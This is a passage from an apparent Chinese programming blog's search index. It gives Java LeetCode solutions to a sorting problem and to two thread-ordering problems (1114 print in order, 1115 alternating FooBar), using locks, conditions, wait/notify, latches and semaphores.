<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">		countSort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">countSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100001</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			count[num + <span class="number">50000</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> != count[i]) &#123;</span><br><span class="line">				<span class="keyword">int</span> temp = count[i];</span><br><span class="line">				<span class="keyword">while</span> (temp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					nums[index++] = i - <span class="number">50000</span>;</span><br><span class="line">					temp--;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>排序方法有很多种，但在实际场景中，快排的效率是最好的，因此，本文就手写一个快排，其他的如堆排序，归并排序就不考虑了。</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>1114. 按序打印</title>
    <url>/2020/03/31/LeetCode/leetcode-001114.%20%E6%8C%89%E5%BA%8F%E6%89%93%E5%8D%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们提供了一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">one</span><span class="params">()</span> </span>&#123; print(<span class="string">"one"</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">two</span><span class="params">()</span> </span>&#123; print(<span class="string">"two"</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">three</span><span class="params">()</span> </span>&#123; print(<span class="string">"three"</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三个不同的线程将会共用一个 Foo 实例。</p>
<pre><code>线程 A 将会调用 one() 方法
线程 B 将会调用 two() 方法
线程 C 将会调用 three() 方法</code></pre><p>请设计修改程序，以确保 two() 方法在 one() 方法之后被执行，three() 方法在 two() 方法之后被执行。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3]</span><br><span class="line">输出: &quot;onetwothree&quot;</span><br><span class="line">解释: </span><br><span class="line">有三个线程会被异步启动。</span><br><span class="line">输入 [1,2,3] 表示线程 A 将会调用 one() 方法，线程 B 将会调用 two() 方法，线程 C 将会调用 three() 方法。</span><br><span class="line">正确的输出是 &quot;onetwothree&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,2]</span><br><span class="line">输出: &quot;onetwothree&quot;</span><br><span class="line">解释: </span><br><span class="line">输入 [1,3,2] 表示线程 A 将会调用 one() 方法，线程 B 将会调用 three() 方法，线程 C 将会调用 two() 方法。</span><br><span class="line">正确的输出是 &quot;onetwothree&quot;。</span><br></pre></td></tr></table></figure>

<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>尽管输入中的数字似乎暗示了顺序，但是我们并不保证线程在操作系统中的调度顺序。</li>
<li>你看到的输入格式主要是为了确保测试的全面性。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>while循环死等</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printFirst.run() outputs "first". Do not change or remove this</span></span><br><span class="line">			<span class="comment">// line.</span></span><br><span class="line">			printFirst.run();</span><br><span class="line">			flag = <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printSecond.run() outputs "second". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="number">2</span> == flag) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			printSecond.run();</span><br><span class="line">			flag = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="number">3</span> == flag) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// printThird.run() outputs "third". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			printThird.run();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用Condition做精准唤醒</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">		 ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">		 Condition condition1 = lock.newCondition();</span><br><span class="line">		 Condition condition2 = lock.newCondition();</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	        </span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">	        <span class="comment">// printFirst.run() outputs "first". Do not change or remove this line.</span></span><br><span class="line">	    	<span class="keyword">try</span> &#123;</span><br><span class="line">	    		lock.lock();</span><br><span class="line">	    		printFirst.run();</span><br><span class="line">	    		flag = <span class="number">2</span>;</span><br><span class="line">		        condition1.signal();</span><br><span class="line">	    	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	    		lock.unlock();</span><br><span class="line">	    	&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">	    	<span class="keyword">try</span> &#123;</span><br><span class="line">	    		lock.lock();</span><br><span class="line">	    		<span class="keyword">if</span> (<span class="number">2</span> != flag) &#123;</span><br><span class="line">	    			condition1.await();</span><br><span class="line">	    		&#125;</span><br><span class="line">	    		</span><br><span class="line">	    		<span class="comment">// printSecond.run() outputs "second". Do not change or remove this line.</span></span><br><span class="line">		        printSecond.run();</span><br><span class="line">		        flag = <span class="number">3</span>;</span><br><span class="line">		        condition2.signal();</span><br><span class="line">	    	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	    		lock.unlock();</span><br><span class="line">	    	&#125;</span><br><span class="line">	        </span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">	    	<span class="keyword">try</span> &#123;</span><br><span class="line">	    		lock.lock();</span><br><span class="line">	    		<span class="keyword">if</span> (<span class="number">3</span> != flag) &#123;</span><br><span class="line">	    			condition2.await();</span><br><span class="line">	    		&#125;</span><br><span class="line">	    		<span class="comment">// printThird.run() outputs "third". Do not change or remove this line.</span></span><br><span class="line">		        printThird.run();</span><br><span class="line">	    	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	    		lock.unlock();</span><br><span class="line">	    	&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>使用wait和notify</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> Object lock = <span class="keyword">new</span> Object();</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printFirst.run() outputs "first". Do not change or remove this</span></span><br><span class="line">			<span class="comment">// line.</span></span><br><span class="line">			<span class="keyword">synchronized</span>(lock) &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span> != flag) &#123;</span><br><span class="line">					lock.wait();</span><br><span class="line">				&#125;</span><br><span class="line">			printFirst.run();</span><br><span class="line">			flag = <span class="number">2</span>;</span><br><span class="line">			lock.notifyAll();</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printSecond.run() outputs "second". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			<span class="keyword">synchronized</span>(lock) &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">2</span> != flag) &#123;</span><br><span class="line">					lock.wait();</span><br><span class="line">				&#125;</span><br><span class="line">				printSecond.run();</span><br><span class="line">				flag = <span class="number">3</span>;</span><br><span class="line">				lock.notifyAll();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">synchronized</span>(lock) &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="number">3</span> != flag) &#123;</span><br><span class="line">					lock.wait();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// printThird.run() outputs "third". Do not change or remove</span></span><br><span class="line">				<span class="comment">// this line.</span></span><br><span class="line">				printThird.run();</span><br><span class="line">				flag = <span class="number">3</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>使用CountDownLatch</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> CountDownLatch c1 = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">private</span> CountDownLatch c2 = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printFirst.run() outputs "first". Do not change or remove this</span></span><br><span class="line">			<span class="comment">// line.</span></span><br><span class="line">			printFirst.run();</span><br><span class="line">			c1.countDown();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			c1.await();</span><br><span class="line">			<span class="comment">// printSecond.run() outputs "second". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			printSecond.run();</span><br><span class="line">			c2.countDown();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			c2.await();</span><br><span class="line">			<span class="comment">// printThird.run() outputs "third". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			printThird.run();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五："><a href="#解法五：" class="headerlink" title="解法五："></a>解法五：</h3><p>使用Semaphore</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> Semaphore s1 = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">private</span> Semaphore s2 = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="comment">// printFirst.run() outputs "first". Do not change or remove this</span></span><br><span class="line">			<span class="comment">// line.</span></span><br><span class="line">			printFirst.run();</span><br><span class="line">			s1.release();;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			s1.acquire();;</span><br><span class="line">			<span class="comment">// printSecond.run() outputs "second". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			printSecond.run();</span><br><span class="line">			s2.release();;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			s2.acquire();</span><br><span class="line">			<span class="comment">// printThird.run() outputs "third". Do not change or remove</span></span><br><span class="line">			<span class="comment">// this line.</span></span><br><span class="line">			printThird.run();</span><br><span class="line">			s2.release();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>多线程</tag>
        <tag>Condition</tag>
        <tag>ReentrantLock</tag>
        <tag>CountDownLatch</tag>
        <tag>Semaphore</tag>
      </tags>
  </entry>
  <entry>
    <title>1115. 交替打印FooBar</title>
    <url>/2020/03/31/LeetCode/leetcode-001115.%20%E4%BA%A4%E6%9B%BF%E6%89%93%E5%8D%B0FooBar/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们提供了一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      print(<span class="string">"foo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      print(<span class="string">"bar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个不同的线程将会共用一个 FooBar 实例。其中一个线程将会调用 foo() 方法，另一个线程将会调用 bar() 方法。</p>
<p>请设计修改程序，以确保 “foobar” 被输出 n 次。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1</span><br><span class="line">输出: &quot;foobar&quot;</span><br><span class="line">解释: 这里有两个线程被异步启动。其中一个调用 foo() 方法, 另一个调用 bar() 方法，&quot;foobar&quot; 将被输出一次。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 2</span><br><span class="line">输出: &quot;foobarfoobar&quot;</span><br><span class="line">解释: &quot;foobar&quot; 将被输出两次。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：（超时）"><a href="#解法一：（超时）" class="headerlink" title="解法一：（超时）"></a>解法一：（超时）</h3><p>while循环死等</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">FooBar</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.n = n;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(Runnable printFoo)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="number">1</span> == flag) &#123;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// printFoo.run() outputs "foo". Do not change or remove this</span></span><br><span class="line">				<span class="comment">// line.</span></span><br><span class="line">				printFoo.run();</span><br><span class="line">				flag = <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(Runnable printBar)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="number">2</span> == flag) &#123;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// printBar.run() outputs "bar". Do not change or remove this</span></span><br><span class="line">				<span class="comment">// line.</span></span><br><span class="line">				printBar.run();</span><br><span class="line">				flag = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用Condition做精准唤醒</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">		Condition c1 = lock.newCondition();</span><br><span class="line">		Condition c2 = lock.newCondition();</span><br><span class="line">		</span><br><span class="line">	    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="title">FooBar</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	        <span class="keyword">this</span>.n = n;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(Runnable printFoo)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">	        <span class="keyword">try</span> &#123;</span><br><span class="line">	        	lock.lock();</span><br><span class="line">		        </span><br><span class="line">		        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		        	<span class="keyword">while</span> (<span class="number">1</span> != flag) &#123;</span><br><span class="line">			        	c1.await();</span><br><span class="line">			        &#125;</span><br><span class="line">		        	<span class="comment">// printFoo.run() outputs "foo". Do not change or remove this line.</span></span><br><span class="line">		        	printFoo.run();</span><br><span class="line">		        	flag = <span class="number">2</span>;</span><br><span class="line">		        	c2.signal();</span><br><span class="line">		        &#125;</span><br><span class="line">	        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	        	lock.unlock();</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(Runnable printBar)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">	        </span><br><span class="line">	        <span class="keyword">try</span> &#123;</span><br><span class="line">	        	lock.lock();</span><br><span class="line">	        	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">	        		<span class="keyword">while</span> (<span class="number">2</span> != flag) &#123;</span><br><span class="line">			        	c2.await();</span><br><span class="line">			        &#125;</span><br><span class="line">		            <span class="comment">// printBar.run() outputs "bar". Do not change or remove this line.</span></span><br><span class="line">		        	printBar.run();</span><br><span class="line">		        	flag = <span class="number">1</span>;</span><br><span class="line">	        		c1.signal();</span><br><span class="line">		        &#125;</span><br><span class="line">	        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">	        	lock.unlock();</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>使用wait和notify</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> Object lock = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">FooBar</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.n = n;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(Runnable printFoo)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="number">1</span> != flag) &#123;</span><br><span class="line">						lock.wait();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="comment">// printFoo.run() outputs "foo". Do not change or remove</span></span><br><span class="line">					<span class="comment">// this</span></span><br><span class="line">					<span class="comment">// line.</span></span><br><span class="line">					printFoo.run();</span><br><span class="line">					flag = <span class="number">2</span>;</span><br><span class="line">					lock.notifyAll();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(Runnable printBar)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="number">2</span> != flag) &#123;</span><br><span class="line">						lock.wait();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="comment">// printBar.run() outputs "bar". Do not change or remove</span></span><br><span class="line">					<span class="comment">// this</span></span><br><span class="line">					<span class="comment">// line.</span></span><br><span class="line">					printBar.run();</span><br><span class="line">					flag = <span class="number">1</span>;</span><br><span class="line">					lock.notifyAll();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>使用CyclicBarrier</p>
